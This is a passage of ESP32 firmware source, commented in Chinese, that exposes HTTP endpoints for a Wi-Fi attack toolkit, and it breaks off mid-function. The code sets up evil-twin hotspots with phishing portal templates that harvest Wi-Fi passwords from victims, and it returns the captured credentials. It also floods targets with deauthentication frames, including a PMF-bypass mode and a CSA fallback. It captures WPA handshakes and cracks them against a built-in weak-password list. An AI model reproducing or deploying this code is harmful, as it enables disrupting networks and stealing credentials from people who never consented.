    bool hidden = (ssid.length() == 0);
    json += "{\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) + "\",";
    json += "\"hidden\":" + String(hidden ? "true" : "false") + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    String auth;
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN:  auth = "Open"; break;
      case WIFI_AUTH_WEP:   auth = "WEP"; break;
      case WIFI_AUTH_WPA_PSK:   auth = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK:  auth = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: auth = "WPA2-Ent"; break;
      case WIFI_AUTH_WPA3_PSK: auth = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: auth = "WPA2/WPA3"; break;
      default: auth = "Unknown"; break;
    }
    json += "\"auth\":\"" + auth + "\"}";
    // 每个 AP 镜像一条结构化遥测 (只读: SSID/RSSI/信道/BSSID/加密方式)
    emitJson("scan_result",
             "\"ssid\":\"" + jsonEscape(hidden ? "" : ssid) +
             "\",\"rssi\":" + String(WiFi.RSSI(i)) +
             ",\"ch\":" + String(WiFi.channel(i)) +
             ",\"bssid\":\"" + WiFi.BSSIDstr(i) +
             "\",\"auth\":\"" + auth + "\"");
    count++;
  }
  json += "]}";
  WiFi.scanDelete();
  log("[scan] 扫描完成, " + String(count) + " 个 AP");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleTarget() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");

  Target t;
  t.set     = true;
  t.ssid    = extractJson(body, "ssid");
  t.bssid   = extractJson(body, "bssid");
  t.auth    = extractJson(body, "auth");
  t.channel = extractJson(body, "channel").toInt();
  t.rssi    = extractJson(body, "rssi").toInt();
  t.ssid.trim();
  t.bssid.trim();
  t.auth.trim();

  // 主目标约束: 2.4G 1-14 (全芯片) 或 5G 信道表内 (仅双频芯片)
  if (!isValidSniffChannel(t.channel)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
    server.send(400, "application/json",
                "{\"ok\":false,\"error\":\"主目标信道无效: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
    server.send(400, "application/json",
                "{\"ok\":false,\"error\":\"主目标必须是 2.4G 频段 (信道 1-14): 本芯片仅支持 2.4GHz\"}");
#endif
    return;
  }

  sTarget = t;
  // 克隆名与主目标保持一模一样 (页面上可显式覆盖)
  sEvilTwin.cloneSsid = sTarget.ssid;
  sDeauth.targetBssid = sTarget.bssid;
  sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
  log("[target] 已设置主目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
      " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"role\":\"primary\"}");
}

/* 双子目标列表: POST 添加/覆盖, DELETE 移除单条或清空 */
static void handleTwinAdd() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String bssid = extractJson(body, "bssid");
  String ssid  = extractJson(body, "ssid");
  bssid.trim(); ssid.trim();
  int channel = extractJson(body, "channel").toInt();
  bool fakeAp = (extractJson(body, "fakeAp") == "true");

  // 双子目标信道: 2.4G 1-14 或 5G 信道表内 (含 DFS, 双子只做跳频注入/假 AP, 不起热点)
  if (!isValidSniffChannel(channel)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标信道无效: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标信道无效: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
    return;
  }
  if (bssid.length() == 0 && !fakeAp) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标需要 BSSID (假 AP 可留空自动生成)\"}");
    return;
  }

  int idx = (bssid.length() ? twinFindByBssid(bssid) : -1);
  if (idx < 0) idx = twinFirstFree();
  if (idx < 0) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"双子目标已达上限 4 条, 请先移除一条\"}");
    return;
  }
  TwinTarget &tw = sTwins[idx];
  tw.used    = true;
  tw.ssid    = ssid;
  tw.bssid   = bssid;
  tw.channel = channel;
  tw.auth    = extractJson(body, "auth");
  tw.rssi    = extractJson(body, "rssi").toInt();
  tw.fakeAp  = fakeAp;
  log("[twin] 已加入双子目标: " + (ssid.length() ? ssid : "(隐藏)") +
      " @ch" + String(channel) + " " + (bssid.length() ? bssid : "(假AP 自动 MAC)") +
      (fakeAp ? " [假AP]" : "") + " 共 " + String(twinCount()) + " 条");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"index\":" + String(idx) +
              ",\"count\":" + String(twinCount()) + "}");
}

static void handleTwinRemove() {
  String body = server.hasArg("plain") ? server.arg("plain") : String();
  String bssid = body.length() ? extractJson(body, "bssid") : String();
  bssid.trim();
  if (bssid.length() == 0) {
    for (int i = 0; i < MAX_TWINS; i++) sTwins[i] = TwinTarget();
    log("[twin] 已清空全部双子目标");
  } else {
    int idx = twinFindByBssid(bssid);
    if (idx >= 0) {
      twinRemoveAt(idx);
      log("[twin] 已移除双子目标 " + bssid + ", 剩 " + String(twinCount()) + " 条");
    }
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"count\":" + String(twinCount()) + "}");
}

/* ---------------- 1. 邪恶双子 API ---------------- */
static void handleEvilTwinStart() {
  String ssid;
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    ssid = extractJson(body, "cloneSsid");
    // 攻击准备 = 钓鱼门户模板 (1=固件升级 2=认证过期 3=网络拥堵重连)
    int tpl = extractJson(body, "template").toInt();
    if (tpl >= 1 && tpl <= 3) sEvilTwin.templateId = tpl;
    // 参考面板的三项设置: 主攻击模式 / 组合攻击 / 持续时间
    int mode = extractJson(body, "mode").toInt();
    if (mode >= 0 && mode <= 2) sDeauth.primaryMode = (uint8_t)mode;
    if (body.indexOf("\"combo\"") >= 0) sDeauth.comboMask = parseComboMask(extractJson(body, "combo"));
    long dur = extractJson(body, "duration").toInt();
    if (dur < 0) dur = 0;
    sDeauth.durationMs = (uint32_t)dur * 1000UL;
    // 阶段 1: 先抓目标 M1/M2 再开克隆热点 (默认开启; preCapture=false 关闭)
    if (body.indexOf("\"preCapture\"") >= 0) {
      String pc = extractJson(body, "preCapture");
      sEvilTwin.hsFirst = !(pc == "false" || pc == "0");
    }
    long hsTo = extractJson(body, "hsTimeout").toInt();
    if (hsTo > 0) sEvilTwin.hsPhaseLimitMs = (uint32_t)hsTo * 1000UL;
  }
  if (ssid.length() > 32) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"克隆 SSID 最长 32 字节\"}");
    return;
  }
  // 后台「克隆 SSID」输入框: 有值 = 显式覆盖; 留空 = 跟随主目标 SSID,
  // 避免沿用上一次攻击留下的自定义名称
  sEvilTwin.cloneSsid = ssid.length() ? ssid : sTarget.ssid;
  if (sEvilTwin.cloneSsid.length() == 0 && sTarget.ssid.length()) {
    sEvilTwin.cloneSsid = sTarget.ssid;
  }
  if (sEvilTwin.active) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"攻击已在进行中, 请先停止\"}");
    return;
  }
  String err;
  if (!eviltwinStartAttack(err)) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  sEvilTwin.active = true;
  sEvilTwin.startTime = millis();
  emitLabState("eviltwin", true);
  if (sEvilTwin.hsPhase) {
    log("[eviltwin] 攻击已发起 (阶段 1/2): 正在 ch" + String(apChannelActive) + " 踢线并抓 " +
        sTarget.ssid + " 的 M1/M2, 抓到后自动开放克隆热点; 主攻击=" + String(sDeauth.primaryMode) +
        " 组合掩码=0x" + String(sDeauth.comboMask, HEX));
  } else {
    log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
        String(sTarget.channel) + (isBand5G((uint8_t)sTarget.channel) ? " 5G" : " 2.4G") +
        "), 主攻击=" + String(sDeauth.primaryMode) + " 组合掩码=0x" + String(sDeauth.comboMask, HEX) +
        (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
        ", 双子目标 " + String(twinCount()) + " 条" +
        (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
        " — 等待目标设备接入并在门户输入密码");
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
              "\",\"apCloned\":" + String(sEvilTwin.apCloned ? "true" : "false") +
              ",\"hsPhase\":" + String(sEvilTwin.hsPhase ? "true" : "false") +
              ",\"preCapture\":" + String(sEvilTwin.hsFirst ? "true" : "false") +
              ",\"channel\":" + String(sTarget.channel) +
              ",\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
              ",\"mode\":" + String(sDeauth.primaryMode) +
              ",\"combo\":" + String(sDeauth.comboMask) +
              ",\"duration\":" + String(sDeauth.durationMs / 1000) +
              ",\"twinHop\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
              ",\"twins\":" + String(twinCount()) + "}");
}

static void handleEvilTwinStop() {
  eviltwinStopAttack(true);
  sEvilTwin.active = false;
  emitLabState("eviltwin", false);
  log("[eviltwin] 攻击已停止, 已恢复原热点 " + apSsid + " (ch" + String(apChannel) +
      ") 累计: 主目标 Deauth " + String(sDeauth.frameCount) + " 帧, 双子跳频 " +
      String(sEvilTwin.hopCount) + " 次 / " + String(sEvilTwin.twinFrameCount) + " 帧");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"active\":false}");
}

static void handleEvilTwinCreds() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{\"credentials\":[";
  uint32_t now = millis();
  for (int i = 0; i < sCredCount; i++) {
    int idx = (sCredHead + 16 - sCredCount + i) % 16;
    if (i) json += ",";
    uint32_t elapsedSec = (now >= sCreds[idx].capturedAt) ? ((now - sCreds[idx].capturedAt) / 1000) : 0;
    String timeStr = (elapsedSec < 3) ? "刚刚" : (String(elapsedSec) + "秒前");
    json += "{\"id\":" + String(sCreds[idx].id) +
            ",\"clientIp\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
            "\",\"mac\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
            "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
            "\",\"verified\":" + String(sCreds[idx].verified ? "true" : "false") +
            ",\"time\":\"" + jsonEscape(timeStr) + "\"}";
  }
  json += "],\"rejects\":" + String(sPortalRejects) + "}";
  server.send(200, "application/json", json);
}

static void handleEvilTwinClearCreds() {
  sCredHead = 0;
  sCredCount = 0;
  log("[eviltwin] 捕获凭据已清空");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true}");
}

/* ---------------- 2. 取消认证器 API ---------------- */
// 诊断: 广播一个唯一 SSID 的伪造信标, 供第三方网卡扫描验证 "帧是否真的到达空口"
static uint32_t sTestBeaconUntil = 0, sTestBeaconCount = 0, sTestBeaconLast = 0;
static uint32_t sTestBeaconErr = 0;
static int32_t sTestBeaconLastErr = 0;
static int sTestBeaconIface = 0;   // 0=AP 接口, 1=STA 接口 (诊断发送路径差异)
static uint8_t sTestBeaconFrame[128];
static uint16_t sTestBeaconLen = 0;
static void handleTestBeacon() {
  String body = server.hasArg("plain") ? server.arg("plain") : "";
  String ssid = extractJson(body, "ssid");
  int secs = extractJson(body, "seconds").toInt();
  if (ssid.length() == 0) ssid = "FW-BEACON-TEST";
  if (secs <= 0) secs = 20;
  if (secs > 60) secs = 60;
  // 默认走 STA 接口: AP 接口注入的信标空口不可见 (见 wifiBeaconTx); 显式 iface=0 才用 AP
  if (body.indexOf("\"iface\"") >= 0) sTestBeaconIface = extractJson(body, "iface").toInt() == 0 ? 0 : 1;
  else sTestBeaconIface = 1;
  sTestBeaconLen = buildBeaconFrame(ssid, "02:AA:BB:CC:DD:EE", (uint8_t)apChannelActive, sTestBeaconFrame);
  sTestBeaconCount = 0;
  sTestBeaconErr = 0;
  sTestBeaconLastErr = 0;
  sTestBeaconLast = 0;
  sTestBeaconUntil = millis() + (uint32_t)secs * 1000;
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"ssid\":\"" + jsonEscape(ssid) + "\",\"channel\":" + String(apChannelActive) +
              ",\"seconds\":" + String(secs) + ",\"iface\":\"" +
              String(sTestBeaconIface ? "sta" : "ap") + "\"}");
}

static void handleDeauthStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String b = extractJson(body, "bssid");
    if (b.length()) sDeauth.targetBssid = b;
    int ch = extractJson(body, "channel").toInt();
    if (ch > 0 && !isValidSniffChannel(ch)) {
      server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
      return;
    }
    if (ch > 0) sDeauth.targetChannel = ch;
    int r = extractJson(body, "reason").toInt();
    if (r > 0) sDeauth.reasonCode = r;
    int rate = extractJson(body, "rate").toInt();
    if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
    if (sDeauth.rateLimitMs == 0) sDeauth.rateLimitMs = 10;
    // 主攻击模式 0=PMF绕过·全设备踢线 1=按加密分流 2=不使用主攻击(只跑组合)
    int mode = extractJson(body, "mode").toInt();
    if (mode >= 0 && mode <= 2) sDeauth.primaryMode = (uint8_t)mode;
    if (body.indexOf("\"combo\"") >= 0) sDeauth.comboMask = parseComboMask(extractJson(body, "combo"));
    // 持续时间: 秒, 0 = 不限时
    long dur = extractJson(body, "duration").toInt();
    if (dur < 0) dur = 0;
    sDeauth.durationMs = (uint32_t)dur * 1000UL;
  }
  if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
    sDeauth.targetBssid = sTarget.bssid;
    sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
  }
  // 技术集合为空 (不使用主攻击 且 未选组合) → 直接拒绝, 避免"启动成功但一帧不发"
  const uint16_t techMask = deauthTechMask();
  if (techMask == 0) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"ok\":false,\"error\":\"未选择任何攻击技术: 请选择主攻击模式或至少一项组合攻击\"}");
    return;
  }
  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
  sDeauth.comboIndex = 0;
  sDeauth.techCursor = 0;
  sDeauth.assocAuthPhase = true;
  fakeApPoolInit(true);   // 每次攻击重新生成固定假 AP 池
  sDeauth.platformBlocked = false;
  sDeauth.startedAt = millis();
  sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
  // 预构 Deauth 管理帧; BSSID 非法则不发送 (只报告, 不再空转计数)
  buildDeauthFrame(sDeauth);
  resetKnownStas();
  sDeauth.txOk = false;
  sDeauth.lastTxErr = 0;
  // 信道对齐: 单射频只能在本机信道发帧 → 攻击前把热点临时切到目标信道, 停止时恢复配置信道
  bool channelAligned = false;
  sDeauth.channelMoved = false;
  sDeauth.restoreChannel = apChannelActive;
  if (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive) {
    if (applyApChannel(sDeauth.targetChannel)) {
      sDeauth.channelMoved = true;
      channelAligned = true;
    }
  }
  const bool channelMismatch = (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive);
  sDeauth.running = true;
  sDeauth.frameCount = 0;
  sDeauth.csaMode = false; sDeauth.csaCount = 0;
  sDeauth.lastTxTime = millis();
  syncPromiscuousEngine();
  csaPrepare(sTarget.ssid.length() ? sTarget.ssid : sDeauth.targetBssid,
             sDeauth.targetBssid, (uint8_t)sDeauth.targetChannel);
  // 平台能力试探: 仅在技术集合包含 Deauth 时探测; 被拒则自动降级为 CSA 强制下线 (兜底)
  if (sDeauth.frameReady && (techMask & ATK_DEAUTH)) {
    const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
    sDeauth.platformBlocked = (probe != ESP_OK);
    sDeauth.txOk = (probe == ESP_OK);
    sDeauth.lastTxErr = probe;
    if (sDeauth.txOk) sDeauth.frameCount = 1;
    else if (sDeauth.csaBeaconLen > 0) {
      sDeauth.csaMode = true;
      log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 降级 CSA 强制下线 (切至 ch" +
          String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
    } else {
      sDeauth.running = false;
      syncPromiscuousEngine();
      emitLabState("deauth", false);
      log("[deauth] 平台限制: Deauth 被驱动拒绝且 CSA 无法构造 (缺目标 SSID/BSSID)");
      server.sendHeader("Access-Control-Allow-Origin", "*");
      server.send(200, "application/json",
                  "{\"ok\":false,\"running\":false,\"injected\":false,\"platformBlocked\":true,"
                  "\"error\":\"本芯片拒绝 Deauth 帧注入, 且缺少目标 SSID 无法改用 CSA\"}");
      return;
    }
  }
  emitLabState("deauth", true);
  // 技术掩码 → 可读名称, 便于日志对照参考面板
  String techNames;
  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) {
    if (techMask & (1u << k)) {
      if (techNames.length()) techNames += "+";
      techNames += atkTechName(k);
    }
  }
  log("[deauth] 取消认证器已启动! 技术=" + techNames +
      (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
      (sDeauth.csaMode ? (" (Deauth 被拒 → CSA 信道切换 ch" + String(sDeauth.csaNewChannel) + ")") : "") +
      " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
      (channelAligned ? " (已对齐目标: AP 信道切至 ch" + String(apChannelActive) + ", 已连设备将短暂掉线)" : "") +
      (channelMismatch ? " (信道对齐失败: 帧仍只能在 ch" + String(apChannelActive) + " 发出, 目标收不到)" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"running\":true,\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
              ",\"csa\":" + String(sDeauth.csaMode ? "true" : "false") +
              ",\"mode\":" + String(sDeauth.primaryMode) +
              ",\"combo\":" + String(sDeauth.comboMask) +
              ",\"duration\":" + String(sDeauth.durationMs / 1000) +
              ",\"tech\":\"" + techNames + "\"" +
              ",\"txChannel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + String(channelAligned ? "true" : "false") +
              ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
}

// 停止 Deauth 引擎核心 (HTTP 与串口 CLI 共用; 串口命令用于被 Deauth 踢掉后自救)
static String stopDeauthEngine() {
  sDeauth.running = false;
  syncPromiscuousEngine();   // 无其他模块需要时关闭 promiscuous (Deauth 注入依赖此状态)
  bool channelRestored = false;
  // 双子攻击进行中: 信道归属由攻击引擎管理, 此处切信道会破坏克隆热点对齐
  const bool ownedByEvilTwin = (sEvilTwin.active && sEvilTwin.deauthAuto);
  if (sDeauth.channelMoved && !ownedByEvilTwin) {
    channelRestored = applyApChannel(sDeauth.restoreChannel);
    sDeauth.channelMoved = false;
  }
  if (ownedByEvilTwin) {
    // 若正处双子跳频窗口, 先回到主目标信道, 否则克隆热点会停在 5G 信道上
    if (sEvilTwin.hopping) {
      applyApChannel(sDeauth.targetChannel);
      sEvilTwin.hopping = false;
    }
    sEvilTwin.deauthAuto = false;
    sEvilTwin.hopEnabled = false;   // 手动停掉 Deauth = 停止压制, 跳频一并停
  }
  emitLabState("deauth", false);
  const String msg = "[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
      (channelRestored ? ", AP 信道已恢复 ch" + String(apChannelActive) : "");
  log(msg);
  return msg;
}

static void handleDeauthStop() {
  stopDeauthEngine();
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false,\"count\":" + String(sDeauth.frameCount) +
              ",\"txChannel\":" + String(apChannelActive) + "}");
}

static void handleDeauthStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
  json += "\"count\":" + String(sDeauth.frameCount) + ",";
  json += "\"unicast\":" + String(sDeauth.unicastCount) + ",";
  json += "\"knownStas\":" + String(sKnownStaCount) + ",";
  json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
  json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
  json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
  json += "\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + ",";
  json += "\"reason\":" + String(sDeauth.reasonCode) + ",";
  json += "\"injected\":" + String(sDeauth.frameReady ? "true" : "false") + ",";
  json += "\"txOk\":" + String(sDeauth.txOk ? "true" : "false") + ",";
  json += "\"platformBlocked\":" + String(sDeauth.platformBlocked ? "true" : "false") + ",";
  json += "\"txErr\":" + String(sDeauth.lastTxErr) + ",";
  json += "\"promWanted\":" + String(promiscuousWanted() ? "true" : "false") + ",";
  { bool prom = false; esp_wifi_get_promiscuous(&prom);
    json += "\"promOn\":" + String(prom ? "true" : "false") + ","; }
  json += "\"txChannel\":" + String(apChannelActive) + ",";
  json += "\"mode\":" + String(sDeauth.primaryMode) + ",";
  json += "\"combo\":" + String(sDeauth.comboMask) + ",";
  json += "\"tech\":\"" + String(atkTechName(sDeauth.techCursor)) + "\",";
  json += "\"duration\":" + String(sDeauth.durationMs / 1000) + ",";
  json += "\"elapsed\":" + String(sDeauth.running ? (millis() - sDeauth.startedAt) / 1000 : 0) + ",";
  json += "\"remain\":" + String((sDeauth.running && sDeauth.stopAt) ?
                                  (int32_t)(sDeauth.stopAt - millis()) / 1000 : -1) + ",";
  json += "\"techCount\":[";
  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) {
    if (k) json += ",";
    json += String(sDeauth.techCount[k]);
  }
  json += "],";
  json += "\"channelMoved\":" + String(sDeauth.channelMoved ? "true" : "false");
  json += "}";
  server.send(200, "application/json", json);
}

/* ---------------- 3. 握手包与密码破解 API ---------------- */
// 启动握手监听 (不发送 HTTP 响应, 供 /api/handshake/start 与 Karma 复用)
// 返回 false 表示参数不合法 (err 为中文原因); 返回 true 时结果看 sHandshake.capturing。
static bool beginHandshakeCapture(String &err) {
  if (!sTarget.set || sTarget.ssid.length() == 0) {
    err = "请先扫描并选择目标 AP — 跑包需要它的 SSID 作为 PBKDF2 盐值";
    return false;
  }
  uint8_t bssid[6];
  if (!parseBssid(sTarget.bssid, bssid)) {
    err = "目标 BSSID 无效, 请重新选择目标";
    return false;
  }

  sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = false;
  sHandshake.pmkid = false;
  sHandshake.captured = false;
  sHandshake.unsupported = false;
  sHandshake.cracking = false;
  sHandshake.crackedPass = "";
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.eapolLen = 0;
  sHandshake.frameCount = 0;
  sHandshake.keyver = 2;
  sHandshake.essid = sTarget.ssid;
  memcpy(sHandshake.targetBssid, bssid, 6);
  sHandshake.hasTarget = true;
  sHandshake.captureStartTime = millis();
  sHsLoggedM1 = sHsLoggedM2 = sHsLoggedDone = false;

  // 单射频: 先对齐到目标信道, 再打开 promiscuous (握手帧走数据帧)
  sHandshake.restoreChannel = apChannelActive;
  const bool needMove = (sTarget.channel > 0 && sTarget.channel != apChannelActive);
  // 注意: 必须先判断 needMove 再切换, 切换后 apChannelActive 已等于目标信道
  sHandshake.channelMoved = needMove && applyApChannel((uint8_t)sTarget.channel);
  const bool channelAligned = !needMove || sHandshake.channelMoved;
  sHandshake.capturing = true;
  if (!syncPromiscuousEngine()) sHandshake.capturing = false;

  emitLabState("handshake", sHandshake.capturing);
  log(String("[eapol] 开始监听 4-Way Handshake: 目标=") + sTarget.ssid +
      " ch=" + String(apChannelActive) + (sHandshake.capturing ? "" : " (promiscuous 启动失败)"));
  if (!channelAligned) {
    log("[eapol] 警告: 未能切到目标信道 ch" + String(sTarget.channel) + ", 当前仍在 ch" +
        String(apChannelActive) + ", 抓不到该网络的握手帧");
  }
  log("[eapol] 提示: 用 Deauther 让目标客户端重连, 即可在空中抓到 M1/M2");
  return true;
}

static void handleHandshakeStart() {
  String err;
  if (!beginHandshakeCapture(err)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":") + (sHandshake.capturing ? "true" : "false") +
              ",\"channel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + ((!sHandshake.channelMoved) ? "true" : "false") +
              ",\"channelMoved\":" + (sHandshake.channelMoved ? "true" : "false") +
              ",\"essid\":\"" + jsonEscape(sHandshake.essid) + "\"}");
}

static void handleHandshakeStop() {
  stopCaptureEngine();
  sHandshake.cracking = false;
  emitLabState("handshake", false);
  log("[eapol] 停止握手包监听, 累计收到 " + String(sHandshake.frameCount) + " 个 EAPOL-Key 帧" +
      (sHandshake.captured ? ", 已具备跑包条件" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":false,\"captured\":") +
              (sHandshake.captured ? "true" : "false") +
              ",\"frames\":" + String(sHandshake.frameCount) + "}");
}

static void handleHandshakeCrack() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"尚未捕获到完整的 M1+M2 — 请先开始监听, 再用 Deauther 触发客户端重连\"}");
    return;
  }
  if (sHandshake.unsupported) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"该网络使用 802.11w PMF (keyver 3), 板载跑包不支持; "
                "请用 /api/handshake/dump 导出后交服务端 /api/wpa/crack\"}");
    return;
  }
  sKarma.running = false;  // 跑包期间停止 Karma, 避免 promiscuous 与 PBKDF2 同时占用射频/CPU
  stopCaptureEngine();     // 帧已保存, 跑包期间释放射频监听, 避免与 PBKDF2 抢 CPU
  sHandshake.cracking = true;
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.crackedPass = "";
  sHandshake.crackStartTime = millis();
  log("[crack] 开始用内置 " + String(sHandshake.crackTotal) + " 条弱口令跑包 (PMK=PBKDF2-HMAC-SHA1 4096 轮) …");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"cracking\":true,\"total\":") + String(sHandshake.crackTotal) + "}");
}

// 握手状态已由 /api/info 的 handshake 字段统一提供 (面板按 2s 轮询),
// 不再单独维护 /api/handshake/status 这条无人调用的冗余路由。

// 导出捕获到的握手材料 (十六进制), 可直接 POST 给服务端 /api/wpa/crack
static void handleHandshakeDump() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"尚未捕获到完整的 M1+M2\"}");
    return;
  }
  String json;
  json.reserve(1200);
  json = "{\"essid\":\"" + jsonEscape(sHandshake.essid) + "\",";
  json += "\"bssid\":\"" + hexBytes(sHandshake.bssid, 6) + "\",";
  json += "\"stmac\":\"" + hexBytes(sHandshake.stmac, 6) + "\",";
  json += "\"anonce\":\"" + hexBytes(sHandshake.anonce, 32) + "\",";
  json += "\"snonce\":\"" + hexBytes(sHandshake.snonce, 32) + "\",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"mic\":\"" + hexBytes(sHandshake.eapol + 81, 16) + "\",";
  json += "\"eapol\":\"" + hexBytes(sHandshake.eapol, sHandshake.eapolLen) + "\"}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

/* ---------------- Sniffer API ---------------- */
static void handleSnifferStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    uint8_t band = parseBandArg(extractJson(body, "band"));
#if !SOC_WIFI_SUPPORT_5G
    if (band == 5) {
      server.sendHeader("Access-Control-Allow-Origin", "*");
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"本芯片仅支持 2.4GHz\"}");
      return;
    }
#endif
    String chStr = extractJson(body, "channel");
    if (chStr.length()) {
      int ch = chStr.toInt();
      if (!isValidSniffChannel(ch)) {
        server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
